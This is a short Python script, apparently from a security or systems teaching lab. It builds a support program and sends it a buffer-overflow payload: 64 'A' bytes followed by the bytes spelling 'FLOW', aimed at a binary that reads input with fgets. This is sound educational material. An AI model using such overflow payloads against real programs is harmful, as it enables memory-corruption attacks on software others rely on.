# SPDX-License-Identifier: BSD-3-Clause
import subprocess


def run_executable():
    subprocess.run(["make"], check=True, cwd="../support")
    payload = 64 * "A" + "\x46\x4c\x4f\x57"
    subprocess.run(
        ["../support/read_stdin_fgets"], input=payload, universal_newlines=True
    )
    subprocess.run(["make", "clean"], check=True, cwd="../support")


if __name__ == "__main__":
    run_executable()
